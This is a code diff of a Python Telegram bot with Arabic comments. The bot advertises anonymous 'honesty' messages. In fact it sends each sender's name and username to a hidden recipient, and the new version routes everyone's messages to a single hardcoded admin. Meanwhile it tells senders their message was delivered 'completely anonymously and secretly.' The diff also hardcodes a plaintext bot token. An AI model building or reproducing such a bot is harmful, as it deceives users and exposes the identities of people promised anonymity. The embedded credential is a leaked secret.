@@ -4,16 +4,18 @@ from telebot import types
 import threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-# التوكن واليوزر الخاصين ببوتك
+# 1. التوكن واليوزر الخاصين ببوتك
 BOT_TOKEN = "8682801321:AAEBx5KjhdYSVCZMZIJck-JgM36Osr_Bz2Y"
 BOT_USERNAME = "Sarrh1bot"
 
+# 2. الـ ID الخاص بكِ (تم التثبيت بنجاح 👑)
+ADMIN_ID = 8820368378  
+
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# قاعدة بيانات مؤقتة في الذاكرة لتخزين الحظر والرسائل والحالات
-users_db = {}      
-messages_db = {}   
-user_states = {}   # لتخزين الشخص اللي بنرسل له {sender_id: target_id}
+# قاعدة بيانات مؤقتة في الذاكرة (لكِ أنتِ فقط)
+blocked_users = set() # قائمة حظر الأشخاص اللي بيزعجوكِ
+messages_db = {}      # لربط الرسائل عشان زر الحظر
 msg_counter = 0
 
 # ----------------- خدعة فتح الـ Port للاستضافة -----------------
@@ -22,7 +24,7 @@ class DummyServer(BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header("Content-type", "text/html")
         self.end_headers()
-        self.wfile.write(b"Bot is running perfectly!")
+        self.wfile.write(b"Bot is running perfectly for Admin!")
 
 def run_dummy_server():
     import os
@@ -35,45 +37,36 @@ def run_dummy_server():
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     user_id = message.from_user.id
-    text_args = message.text.split()
     
-    if user_id not in users_db:
-        users_db[user_id] = {"blocked_users": set()}
-        
-    # إذا دخل المستخدم عن طريق رابط حساب شخص آخر
-    if len(text_args) > 1 and text_args[1].isdigit():
-        target_id = int(text_args[1])
-        
-        if target_id == user_id:
-            bot.send_message(user_id, "❌ لا يمكنك إرسال رسالة صراحة لنفسك!")
-            return
-            
-        # حفظ الوجهة في الذاكرة وتغيير حالة المستخدم
-        user_states[user_id] = target_id
-        bot.send_message(user_id, "✍️ أرسل رسالتك الآن، وسيتم تسليمها بشكل مجهول وسري تماماً:")
+    # رابط الاستقبال الخاص بكِ أنتِ فقط دائماً وأبداً!
+    admin_share_link = f"https://t.me/{BOT_USERNAME}?start={ADMIN_ID}"
+
+    # إذا كنتِ أنتِ من يفتح البوت (المديرة)
+    if user_id == ADMIN_ID:
+        welcome_text = (
+            "👋 أهلاً بكِ يا مديرة البوت!\n\n"
+            f"🔗 الرابط الخاص بكِ لاستقبال الرسائل هو:\n`{admin_share_link}`\n\n"
+            "أي رسالة يرسلها أي مستخدم في البوت ستصلكِ هنا فوراً مع معلوماته السرية."
+        )
+        bot.send_message(user_id, welcome_text, parse_mode="Markdown")
         return
 
-    # عرض رابط الاستقبال الخاص بالمستخدم
-    share_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
+    # إذا كان أي شخص آخر في العالم يفتح البوت
     welcome_text = (
         "👋 أهلاً بك في بوت الصراحة والرسائل المجهولة!\n\n"
-        f"🔗 الرابط الخاص بك لاستقبال الرسائل هو:\n`{share_link}`\n\n"
-        "انشره في حساباتك لتبدأ في استقبال رسائل مجهولة وسرية من أصدقائك."
+        "✍️ أرسل رسالتك الآن مباشرة، وسيتم تسليمها للمستخدم بشكل مجهول وسري تماماً:"
     )
-    bot.send_message(user_id, welcome_text, parse_mode="Markdown")
+    bot.send_message(user_id, welcome_text)
 
-# معالج استقبال الرسائل الموجهة (بديل register_next_step عشان نضمن الفصل)
-@bot.message_handler(func=lambda message: message.from_user.id in user_states)
-def handle_anonymous_routing(message):
+# استقبال كل الرسائل من كل الناس وتوجيهها لكِ أنتِ فقط
+@bot.message_handler(func=lambda message: message.from_user.id != ADMIN_ID)
+def handle_admin_only_routing(message):
     global msg_counter
     sender_id = message.from_user.id
-    target_id = user_states[sender_id] # جلب الشخص المستهدف
 
-    # التحقق من الحظر
-    if target_id in users_db and sender_id in users_db[target_id]["blocked_users"]:
+    # التحقق إذا كان هذا الشخص محظوراً من قبلكِ
+    if sender_id in blocked_users:
         bot.send_message(sender_id, "❌ عذراً، لا يمكنك إرسال رسالة لهذا المستخدم.")
-        # إنهاء الحالة
-        del user_states[sender_id]
         return
 
     if message.content_type != 'text':
@@ -83,18 +76,17 @@ def handle_anonymous_routing(message):
     msg_counter += 1
     messages_db[msg_counter] = sender_id
 
-    # إنشاء زر الحظر التفاعلي
+    # إنشاء زر الحظر التفاعلي لكِ
     markup = types.InlineKeyboardMarkup()
     block_button = types.InlineKeyboardButton(
         text="🚫 حظر هذا المستخدم", 
-        callback_data=f"toggleblock_{msg_counter}"
+        callback_data=f"admintoggle_{msg_counter}"
     )
     markup.add(block_button)
 
     first_name = message.from_user.first_name
     username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد معرف"
     
-    # رسالة كشف الهوية الموجهة لك أنت فقط (تُرسل لـ target_id)
     info_text = (
         f"📩 **وصلتك رسالة صراحة جديدة!**\n\n"
         f"💬 **الرسالة:** {message.text}\n\n"
@@ -105,51 +97,46 @@ def handle_anonymous_routing(message):
     )
 
     try:
-        # إرسال البيانات لك بشكل منفصل تماماً عن محادثة المرسل
-        bot.send_message(chat_id=target_id, text=info_text, reply_markup=markup, parse_mode="Markdown")
-        
-        # إرسال رسالة التأكيد المموّهة للمرسل (صاحبتك) في شاتها الخاص
+        # إرسال الرسالة لكِ أنتِ فقط
+        bot.send_message(chat_id=ADMIN_ID, text=info_text, reply_markup=markup, parse_mode="Markdown")
+        # طمأنة المرسل في شاته الخاص بأنها سرية
         bot.send_message(chat_id=sender_id, text="✅ تم إرسال رسالتك بنجاح وبسرية تامة!")
     except Exception as e:
-        bot.send_message(chat_id=sender_id, text="❌ فشل إرسال الرسالة، قد يكون المستخدم قام بتعطيل البوت.")
-    
-    # مسح حالة الإرسال بعد النجاح حتى يستطيع استخدام البوت طبيعي مجدداً
-    del user_states[sender_id]
+        print(f"خطأ في الإرسال للآدمين: {e}")
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith('toggleblock_'))
-def handle_toggle_block_callback(call):
-    receiver_id = call.from_user.id
+@bot.callback_query_handler(func=lambda call: call.data.startswith('admintoggle_'))
+def handle_admin_block(call):
+    if call.from_user.id != ADMIN_ID:
+        bot.answer_callback_query(call.id, "❌ أنت لست مدير البوت!")
+        return
+
     msg_id = int(call.data.split('_')[1])
-    
     sender_id = messages_db.get(msg_id)
     
     if not sender_id:
-        bot.answer_callback_query(call.id, "⚠️ انتهت صلاحية هذا الإجراء أو البيانات غير متوفرة.")
+        bot.answer_callback_query(call.id, "⚠️ انتهت صلاحية البيانات.")
         return
-
-    if receiver_id not in users_db:
-        users_db[receiver_id] = {"blocked_users": set()}
 
     markup = types.InlineKeyboardMarkup()
     
     # فك الحظر
-    if sender_id in users_db[receiver_id]["blocked_users"]:
-        users_db[receiver_id]["blocked_users"].remove(sender_id)
-        btn = types.InlineKeyboardButton(text="🚫 حظر هذا المستخدم", callback_data=f"toggleblock_{msg_id}")
+    if sender_id in blocked_users:
+        blocked_users.remove(sender_id)
+        btn = types.InlineKeyboardButton(text="🚫 حظر هذا المستخدم", callback_data=f"admintoggle_{msg_id}")
         markup.add(btn)
         
         clean_text = call.message.text.replace("\n\n🚫 [هذا المستخدم محظور حالياً]", "")
-        bot.edit_message_text(chat_id=receiver_id, message_id=call.message.message_id, text=clean_text, reply_markup=markup)
+        bot.edit_message_text(chat_id=ADMIN_ID, message_id=call.message.message_id, text=clean_text, reply_markup=markup)
         bot.answer_callback_query(call.id, "🟢 تم إلغاء الحظر بنجاح!")
         
     # الحظر
     else:
-        users_db[receiver_id]["blocked_users"].add(sender_id)
-        btn = types.InlineKeyboardButton(text="🟢 إلغاء حظر هذا المستخدم", callback_data=f"toggleblock_{msg_id}")
+        blocked_users.add(sender_id)
+        btn = types.InlineKeyboardButton(text="🟢 إلغاء حظر هذا المستخدم", callback_data=f"admintoggle_{msg_id}")
         markup.add(btn)
         
         bot.edit_message_text(
-            chat_id=receiver_id, 
+            chat_id=ADMIN_ID, 
             message_id=call.message.message_id, 
             text=f"{call.message.text}\n\n🚫 [هذا المستخدم محظور حالياً]", 
             reply_markup=markup
@@ -157,13 +144,12 @@ def handle_toggle_block_callback(call):
         bot.answer_callback_query(call.id, "🚫 تم حظر المستخدم!")
 
 if __name__ == "__main__":
-    print("🧹 جاري حذف الـ Webhook القديم وتنظيف الاتصال بالخادم...")
+    print("🧹 جاري تنظيف الجلسات وحذف الـ Webhook...")
     try:
         bot.delete_webhook(drop_pending_updates=True)
-        print("✅ تم تنظيف الاتصال بنجاح!")
-    except Exception as e:
-        print(f"⚠️ فشل حذف الـ Webhook: {e}")
+    except Exception:
+        pass
         
     threading.Thread(target=run_dummy_server, daemon=True).start()
-    print("🤖 البوت يعمل بنظام الحالات المفصولة والمموّهة بالكامل...")
+    print("👑 البوت يعمل الآن بنظام المالك الحصري (لكِ أنتِ فقط وكل شيء سري)...")
     bot.infinity_polling()
